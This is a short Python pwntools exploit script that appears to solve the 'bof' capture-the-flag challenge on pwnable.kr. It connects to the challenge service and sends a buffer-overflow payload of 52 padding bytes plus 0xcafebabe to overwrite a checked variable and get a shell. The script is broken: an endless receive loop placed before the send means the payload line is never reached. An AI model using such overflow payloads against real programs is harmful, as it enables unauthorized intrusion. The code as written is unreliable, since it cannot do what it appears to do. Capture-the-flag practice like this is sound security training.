#!/usr/bin/env python3

from pwn import *

def conn():
    if args.LOCAL:
        r = process('./bof')
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwnable.kr", 9000)

    return r


def main():
    r = conn()

    while True:
        print(r.recvall())

    r.sendlineafter(b'me : ', b'A'*52 + p32(0xcafebabe))

    r.interactive()


if __name__ == "__main__":
    main()